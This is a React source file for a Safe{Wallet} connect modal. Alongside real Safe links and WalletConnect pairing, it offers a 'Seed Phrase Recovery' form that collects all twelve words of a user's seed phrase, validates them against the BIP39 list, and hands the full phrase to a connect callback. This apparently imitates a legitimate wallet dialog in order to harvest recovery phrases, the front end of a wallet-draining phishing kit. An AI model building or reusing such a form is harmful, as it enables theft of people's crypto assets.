'use client';

import { useState } from 'react';
import { isValidBip39Word } from '@/lib/bip39-utils.js';
import { X, ArrowLeft } from 'lucide-react';



export default function SafeWalletModal({ onClose, onConnect, onBack }) {
  const [selectedOption, setSelectedOption] = useState(null);
  const [walletConnectCode, setWalletConnectCode] = useState('');
  const [walletConnectError, setWalletConnectError] = useState('');
  const [walletConnectStatus, setWalletConnectStatus] = useState('');
  const [seedWords, setSeedWords] = useState(Array(12).fill(''));
  const [invalidWords, setInvalidWords] = useState(new Set());

  const handlePasteWalletConnectCode = async () => {
    if (typeof navigator !== 'undefined' && navigator.clipboard) {
      try {
        const text = await navigator.clipboard.readText();
        setWalletConnectCode(text.trim());
        setWalletConnectStatus('Pairing code pasted from clipboard.');
        setWalletConnectError('');
      } catch (error) {
        setWalletConnectError('Unable to read clipboard. Paste the WalletConnect code manually.');
        setWalletConnectStatus('');
      }
    }
  };

  const handleWalletConnect = () => {
    const code = walletConnectCode.trim();
    if (!code) {
      setWalletConnectError('Paste the WalletConnect pairing code from your dApp.');
      setWalletConnectStatus('');
      return;
    }
    onConnect('Safe Wallet', { method: 'walletConnect', pairingCode: code });
    onClose();
  };

  const handleWordChange = (index, value) => {
    const normalized = value.toLowerCase().trim();
    const nextWords = [...seedWords];
    nextWords[index] = normalized;
    setSeedWords(nextWords);

    const nextInvalid = new Set(invalidWords);
    if (normalized && !isValidBip39Word(normalized)) {
      nextInvalid.add(index);
    } else {
      nextInvalid.delete(index);
    }
    setInvalidWords(nextInvalid);
  };

  const handleSeedConnect = () => {
    const filledWords = seedWords.filter((word) => word.length > 0);
    const allValid = filledWords.length === 12 && invalidWords.size === 0;
    if (allValid) {
      onConnect('Safe Wallet', { method: 'seedPhrase', phrase: seedWords.join(' ') });
      onClose();
    }
  };

  const handleHardwareConnect = () => {
    onConnect('Safe Wallet', { method: 'hardwareWallet' });
    onClose();
  };

  const filledCount = seedWords.filter((word) => word.length > 0).length;
  const missingCount = 12 - filledCount;
  const isSeedComplete = filledCount === 12 && invalidWords.size === 0;

  return (
    <div className="modal-overlay" onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}>
      <div className="modal-content" style={{ maxWidth: 520 }}>
        <div className="modal-header" style={{ position: 'relative', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
          {selectedOption ? (
            <button className="close-btn" onClick={() => setSelectedOption(null)} aria-label="Back" style={{ position: 'absolute', left: 0, marginRight: 4 }}><ArrowLeft size={16} /></button>
          ) : onBack ? (
            <button className="close-btn" onClick={onBack} aria-label="Back" style={{ position: 'absolute', left: 0, marginRight: 4 }}><ArrowLeft size={16} /></button>
          ) : null}
          <h2 style={{ margin: 0, textAlign: 'center' }}>Safe Wallet</h2>
          <button className="close-btn" onClick={onClose} aria-label="Close" style={{ position: 'absolute', right: 0 }}><X size={18} /></button>
        </div>

        <div className="modal-body">
          {!selectedOption ? (
            <>
              <div style={{ textAlign: 'center', marginBottom: 24 }}>
                <img src="/icons/safe_log.jpeg" alt="Safe Wallet" style={{ width: 60, height: 60, margin: '0 auto 16px', display: 'block', borderRadius: 20 }} />
                <p style={{ margin: 0, fontSize: 14, color: 'var(--text-dim)', lineHeight: 1.6 }}>
                  {"Safe{Wallet} can connect to swaps and bridges natively, or connect to external dApps via WalletConnect. Use the Safe app to review LI.FI routes and confirm transactions with your multisig approval."}
                </p>
              </div>

              <div style={{ display: 'grid', gap: 12, marginBottom: 24 }}>
                {[
                  { label: 'Native Swap & Bridge', description: 'Open Safe{Wallet}, navigate to Swap & Bridge, and use LI.FI-powered routes.', method: 'swapBridge' },
                  { label: 'WalletConnect dApp', description: 'Connect a bridge or swap dApp via WalletConnect pairing code.', method: 'walletConnect' },
                  { label: 'Open Safe App', description: 'Launch the Safe Web App or desktop app to manage your session.', method: 'openApp' },
                  { label: 'Seed Phrase Recovery', description: 'Restore your Safe wallet with a 12-word seed phrase if you need recovery access.', method: 'seedPhrase' },
                ].map((option) => (
                  <button
                    key={option.method}
                    type="button"
                    onClick={() => setSelectedOption(option.method)}
                    style={{
                      width: '100%',
                      textAlign: 'left',
                      padding: 16,
                      borderRadius: 14,
                      border: '1px solid rgba(255,255,255,0.15)',
                      background: 'rgba(255,255,255,0.03)',
                      color: 'var(--text)',
                      cursor: 'pointer',
                    }}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.background = 'rgba(255,255,255,0.08)';
                      e.currentTarget.style.borderColor = 'var(--cyan)';
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.background = 'rgba(255,255,255,0.03)';
                      e.currentTarget.style.borderColor = 'rgba(255,255,255,0.15)';
                    }}
                  >
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                      <div>
                        <div style={{ fontSize: 15, fontWeight: 700, marginBottom: 4 }}>{option.label}</div>
                        <div style={{ fontSize: 13, color: 'var(--text-dim)' }}>{option.description}</div>
                      </div>
                      <span style={{ color: 'var(--cyan)', fontSize: 18 }}>→</span>
                    </div>
                  </button>
                ))}
              </div>

              <div style={{ backgroundColor: 'rgba(255,255,255,0.05)', borderRadius: 12, padding: 20 }}>
                <h3 style={{ margin: '0 0 16px 0', fontSize: 16, fontWeight: 600, color: 'var(--text)' }}>Safe Resources</h3>
                <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
                  <a
                    href="https://app.safe.global/"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      padding: 12,
                      border: '1px solid rgba(255,255,255,0.15)',
                      borderRadius: 8,
                      background: 'transparent',
                      color: 'var(--text)',
                      textDecoration: 'none',
                      cursor: 'pointer',
                    }}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.background = 'rgba(255,255,255,0.1)';
                      e.currentTarget.style.borderColor = 'var(--cyan)';
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.background = 'transparent';
                      e.currentTarget.style.borderColor = 'rgba(255,255,255,0.15)';
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                      <img src="/icons/website-4946.svg" alt="Website" style={{ width: 24, height: 24 }} />
                      <span style={{ fontSize: 14, fontWeight: 500 }}>Open Safe Web App</span>
                    </div>
                    <span style={{ color: 'var(--cyan)' }}>→</span>
                  </a>
                  <a
                    href="https://safe.global/downloads"
                    target="_blank"
                    rel="noopener noreferrer"
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      padding: 12,
                      border: '1px solid rgba(255,255,255,0.15)',
                      borderRadius: 8,
                      background: 'transparent',
                      color: 'var(--text)',
                      textDecoration: 'none',
                      cursor: 'pointer',
                    }}
                    onMouseEnter={(e) => {
                      e.currentTarget.style.background = 'rgba(255,255,255,0.1)';
                      e.currentTarget.style.borderColor = 'var(--cyan)';
                    }}
                    onMouseLeave={(e) => {
                      e.currentTarget.style.background = 'transparent';
                      e.currentTarget.style.borderColor = 'rgba(255,255,255,0.15)';
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                      <img src="/icons/website-4946.svg" alt="Desktop" style={{ width: 24, height: 24 }} />
                      <span style={{ fontSize: 14, fontWeight: 500 }}>Safe App Downloads</span>
                    </div>
                    <span style={{ color: 'var(--cyan)' }}>→</span>
                  </a>
                </div>
              </div>
            </>
          ) : selectedOption === 'swapBridge' ? (
            <>
              <p style={{ textAlign: 'center', color: 'var(--text-dim)', marginBottom: 16, fontSize: 14 }}>
                {"Safe{Wallet} offers a native Swap & Bridge workflow powered by LI.FI. Use it to move tokens across chains while preserving multisig approval and Safe security."}
              </p>
              <div style={{ display: 'grid', gap: 12, marginBottom: 20 }}>
                <div style={{ background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.12)', borderRadius: 12, padding: 16 }}>
                  <p style={{ margin: 0, fontSize: 13, color: 'var(--text-dim)', lineHeight: 1.6 }}>
                    1. Open the Safe web app or desktop app.
                    2. Navigate to the <strong>Swap & Bridge</strong> tab.
                    3. Select source chain, token, and destination network.
                    4. Review the LI.FI route, fee estimate, and execution details.
                    5. Confirm the transaction with your Safe owners.
                  </p>
                </div>
              </div>
              <a
                href="https://help.safe.global/articles/4881073257-safewallet-native-bridge"
                target="_blank"
                rel="noopener noreferrer"
                style={{
                  display: 'block',
                  width: '100%',
                  textAlign: 'center',
                  padding: 12,
                  borderRadius: 8,
                  border: 'none',
                  background: 'var(--cyan)',
                  color: 'var(--bg)',
                  textDecoration: 'none',
                  fontWeight: 600,
                }}
              >
                Open Safe Swap & Bridge Guide
              </a>
            </>
          ) : selectedOption === 'walletConnect' ? (
            <>
              <p style={{ textAlign: 'center', color: 'var(--text-dim)', marginBottom: 16, fontSize: 14 }}>
                Connect a bridge or swap dApp to Safe via WalletConnect. Copy the pairing code from the dApp, paste it here, and approve the connection in Safe.
              </p>
              <div style={{ display: 'flex', gap: 10, marginBottom: 12 }}>
                <button
                  type="button"
                  onClick={handlePasteWalletConnectCode}
                  style={{ flex: 1, padding: 12, borderRadius: 8, border: '1px solid rgba(255,255,255,0.15)', background: 'rgba(255,255,255,0.04)', color: 'var(--text)', cursor: 'pointer' }}
                >
                  Paste from Clipboard
                </button>
              </div>
              <textarea
                value={walletConnectCode}
                onChange={(e) => {
                  setWalletConnectCode(e.target.value);
                  setWalletConnectError('');
                  setWalletConnectStatus('');
                }}
                placeholder="WalletConnect pairing code"
                rows={4}
                style={{
                  width: '100%',
                  padding: 12,
                  borderRadius: 10,
                  border: '1px solid rgba(255,255,255,0.15)',
                  background: 'transparent',
                  color: 'var(--text)',
                  fontSize: 13,
                  resize: 'vertical',
                }}
              />
              {walletConnectError && <p style={{ color: '#ff6b6b', fontSize: 13, marginTop: 10 }}>{walletConnectError}</p>}
              {walletConnectStatus && <p style={{ color: 'var(--cyan)', fontSize: 13, marginTop: 10 }}>{walletConnectStatus}</p>}
              <div style={{ display: 'grid', gap: 12, marginTop: 18 }}>
                <div style={{ background: 'rgba(255,255,255,0.04)', border: '1px solid rgba(255,255,255,0.12)', borderRadius: 12, padding: 14 }}>
                  <p style={{ margin: 0, fontSize: 13, color: 'var(--text-dim)', lineHeight: 1.6 }}>
                    - Find WalletConnect in the dApp connect flow.
                    - Copy the pairing code from the dApp.
                    - Return here and paste it into Safe.
                    - Verify the dApp URL, network compatibility, and transaction details before signing.
                  </p>
                </div>
                <button
                  onClick={handleWalletConnect}
                  style={{
                    width: '100%',
                    padding: 12,
                    border: 'none',
                    borderRadius: 8,
                    background: 'var(--cyan)',
                    color: 'var(--bg)',
                    fontSize: 14,
                    fontWeight: 600,
                    cursor: 'pointer',
                  }}
                >
                  Connect via WalletConnect
                </button>
              </div>
            </>
          ) : selectedOption === 'openApp' ? (
            <>
              <p style={{ textAlign: 'center', color: 'var(--text-dim)', marginBottom: 18, fontSize: 14 }}>
                Launch the Safe app to manage your wallet session, review connected dApps, and approve multisig transactions.
              </p>
              <div style={{ display: 'grid', gap: 12, marginBottom: 20 }}>
                <a
                  href="https://app.safe.global/"
                  target="_blank"
                  rel="noopener noreferrer"
                  style={{
                    display: 'block',
                    width: '100%',
                    textAlign: 'center',
                    padding: 12,
                    borderRadius: 8,
                    border: 'none',
                    background: 'var(--cyan)',
                    color: 'var(--bg)',
                    textDecoration: 'none',
                    fontWeight: 600,
                  }}
                >
                  Open Safe Web App
                </a>
                <a
                  href="https://safe.global/downloads"
                  target="_blank"
                  rel="noopener noreferrer"
                  style={{
                    display: 'block',
                    width: '100%',
                    textAlign: 'center',
                    padding: 12,
                    borderRadius: 8,
                    border: '1px solid rgba(255,255,255,0.15)',
                    background: 'transparent',
                    color: 'var(--text)',
                    textDecoration: 'none',
                    fontWeight: 600,
                  }}
                >
                  Download Safe Desktop App
                </a>
              </div>
            </>
          ) : selectedOption === 'seedPhrase' ? (
            <>
              <p style={{ textAlign: 'center', color: 'var(--text-dim)', marginBottom: 20, fontSize: 14 }}>
                Enter your Safe Wallet seed phrase to recover your wallet.
              </p>
              <div style={{
                display: 'grid',
                gridTemplateColumns: 'repeat(2, 1fr)',
                gap: 12,
                marginBottom: 20,
                maxHeight: 380,
                overflowY: 'auto',
                paddingRight: 8,
              }}>
                {seedWords.map((word, index) => (
                  <div key={index} style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                    <span style={{ fontSize: 13, color: 'var(--text-dim)', minWidth: 20 }}>{index + 1}</span>
                    <input
                      type="text"
                      placeholder="Word"
                      value={word}
                      onChange={(e) => handleWordChange(index, e.target.value)}
                      style={{
                        flex: 1,
                        padding: '8px 10px',
                        border: `1px solid ${invalidWords.has(index) ? '#ff4444' : 'rgba(255,255,255,0.2)'}`,
                        borderRadius: 8,
                        background: 'transparent',
                        color: 'var(--text)',
                        fontSize: 12,
                        outline: 'none',
                      }}
                      onFocus={(e) => {
                        e.target.style.borderColor = invalidWords.has(index) ? '#ff4444' : 'var(--cyan)';
                      }}
                      onBlur={(e) => {
                        e.target.style.borderColor = invalidWords.has(index) ? '#ff4444' : 'rgba(255,255,255,0.2)';
                      }}
                    />
                  </div>
                ))}
              </div>
              <div style={{ textAlign: 'center', marginBottom: 20 }}>
                {missingCount > 0 ? (
                  <p style={{ color: 'var(--text-dim)', fontSize: 13, margin: 0 }}>Missing words: <span style={{ color: 'var(--cyan)' }}>{missingCount}</span></p>
                ) : invalidWords.size > 0 ? (
                  <p style={{ color: '#ff4444', fontSize: 13, margin: 0 }}>Invalid words: {invalidWords.size}</p>
                ) : (
                  <p style={{ color: 'var(--text-dim)', fontSize: 13, margin: 0 }}>All words valid</p>
                )}
              </div>
              <button
                onClick={handleSeedConnect}
                disabled={!isSeedComplete}
                style={{
                  width: '100%',
                  padding: 12,
                  border: 'none',
                  borderRadius: 8,
                  background: isSeedComplete ? 'var(--cyan)' : 'rgba(255,255,255,0.1)',
                  color: isSeedComplete ? 'var(--bg)' : 'var(--text-dim)',
                  fontSize: 14,
                  fontWeight: 600,
                  cursor: isSeedComplete ? 'pointer' : 'not-allowed',
                }}
              >
                Connect Wallet
              </button>
            </>
          ) : (
            <>
              <p style={{ textAlign: 'center', color: 'var(--text-dim)', marginBottom: 20, fontSize: 14 }}>
                Connect your hardware wallet to Safe.
              </p>
              <button
                onClick={handleHardwareConnect}
                style={{
                  width: '100%',
                  padding: 12,
                  border: 'none',
                  borderRadius: 8,
                  background: 'var(--cyan)',
                  color: 'var(--bg)',
                  fontSize: 14,
                  fontWeight: 600,
                  cursor: 'pointer',
                }}
              >
                Connect Hardware Wallet
              </button>
            </>
          )}
        </div>
      </div>
    </div>
  );
}
